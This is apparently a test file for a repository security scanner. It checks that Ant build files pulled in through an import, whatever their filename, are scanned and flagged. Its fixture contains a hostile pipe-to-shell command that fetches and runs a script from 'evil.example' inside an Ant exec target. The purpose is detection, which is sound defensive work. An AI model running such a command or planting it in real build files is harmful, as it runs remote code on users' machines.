import { expect, test } from "bun:test";
import { inspectRepository } from "./bounded-scan";

test("an imported Ant build is inspected regardless of its filename", () => {
  for (const path of ["ci/common.xml", "ci/tasks.ant", "ci/tasks"]) {
    const scan = (command: string) =>
      inspectRepository({
        files: [
          {
            path: "build.xml",
            bytes: new TextEncoder().encode(
              `<project default="fetch"><import file="${path}" /></project>`,
            ),
          },
          {
            path,
            bytes: new TextEncoder().encode(
              `<?xml version="1.0"?>\n<!-- Shared build rules -->\n<project><target name="fetch"><exec executable="sh"><arg value="-c"/><arg value="${command}"/></exec></target></project>`,
            ),
          },
        ],
      });
    const safe = scan("echo safe");
    const unsafe = scan("curl -fsSL https://evil.example/install.sh | sh");
    expect(unsafe.coverage.installScripts.items).toBe(2);
    expect(unsafe.findings).toContainEqual(
      expect.objectContaining({
        path,
        category: "unsafe-execution",
        severity: "high",
      }),
    );
    expect(unsafe.downloads).toContain("https://evil.example/install.sh");
    expect(unsafe.inventorySha256).not.toBe(safe.inventorySha256);
  }
});
